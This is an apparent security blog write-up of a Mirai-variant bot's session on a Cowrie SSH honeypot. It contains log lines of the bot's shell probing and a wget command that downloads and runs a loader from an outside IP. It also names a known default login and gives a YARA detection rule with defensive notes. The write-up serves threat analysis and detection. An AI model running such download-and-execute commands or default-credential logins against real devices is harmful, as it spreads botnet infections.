+++
title = "Case File 01: A Mirai Variant's First Ten Minutes on a Cowrie Sensor"
date = "2025-01-18"
description = "Session replay and command breakdown of a Mirai-family bot's initial check-in against a Cowrie SSH honeypot."
tags = ["honeypot", "cowrie", "mirai", "botnet"]
toc = true
[extra]
newer = "writeups/case-file-02-redis-cryptominer.md"
+++

A Cowrie sensor logged forty-one failed login attempts in under a minute before one finally landed: `root:xc3511`, a credential pair that has been circulating on default-password lists since the original Mirai source leaked in 2016. What followed is worth walking through slowly, because almost nothing about the playbook has changed in nine years, and that consistency is itself the finding.

<!-- more -->

## The session

Cowrie's session log gives a clean, second-by-second timeline. The client fingerprinted the shell before doing anything destructive:

```text
2025-01-18 03:14:02 [SSH] login attempt root:xc3511 succeeded
2025-01-18 03:14:03 [CMD] /bin/busybox ECCHI
2025-01-18 03:14:03 [CMD] shell
2025-01-18 03:14:04 [CMD] enable
2025-01-18 03:14:04 [CMD] system
2025-01-18 03:14:04 [CMD] cat /proc/mounts; /bin/busybox ABCD
```

The `busybox ECCHI` / `ABCD` pair is a classic Mirai-lineage probe — it isn't a real command, it's a check for whether the shell echoes garbage back verbatim, which tells the bot whether it is talking to a genuine BusyBox-based embedded Linux shell or something emulated. Cowrie answers convincingly enough that the session continued.

## The payload drop

Nine seconds later the bot moved to fetch a loader over plain HTTP, cycling through several download primitives until one "worked" against the honeypot's fake filesystem:

```text
2025-01-18 03:14:13 [CMD] cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
2025-01-18 03:14:14 [CMD] wget http://203.0.113.44/bins/mirai.arm7 -O - > dlr; sh dlr
2025-01-18 03:14:15 [CMD] chmod 777 dlr
2025-01-18 03:14:15 [CMD] ./dlr arm7
```

The download IP (`203.0.113.44`, documentation range here) hosted a small stable of architecture-specific binaries — `.arm7`, `.mips`, `.mpsl`, `.x86` — the standard Mirai fan-out pattern for hitting whatever CPU the compromised device happens to run.

## What the binary does once it lands

The fetched sample was pulled and detonated separately in an isolated VM. It is unmistakably Mirai-derived: XOR-obfuscated string table with the familiar `0xDEADBEEF`-adjacent key rotation, a hardcoded command-and-control domain resolved before anything else runs, and a scanner module that immediately starts probing outbound port 23 and 2323 with the same default-credential list it was caught with.

```yara
rule mirai_variant_xorstrings
{
    meta:
        description = "Detects XOR-obfuscated string table used by this Mirai variant"
        author = "kessa"
    strings:
        $xor_marker = { 68 65 6C 6C 6F 5D 3A 20 }
        $busybox_probe1 = "ECCHI"
        $busybox_probe2 = "ABCD"
    condition:
        uint32(0) == 0x464C457F and any of them
}
```

## Detection notes

- The `busybox ECCHI` / `ABCD` probe pair is a reliable, low-false-positive signature for Mirai-family reconnaissance on any SSH or Telnet honeypot — flag it even if no credential succeeds.
- Outbound `wget ... -O - | sh` piped installs from a raw IP literal (no DNS) are almost never legitimate device behavior; alerting on that shape of command is cheap and effective.
- The C2 domain resolved by this sample had a TTL of 300 seconds and had already rotated by the time this was published, so it is deliberately omitted here in favor of the behavioral indicators above, which age far better.
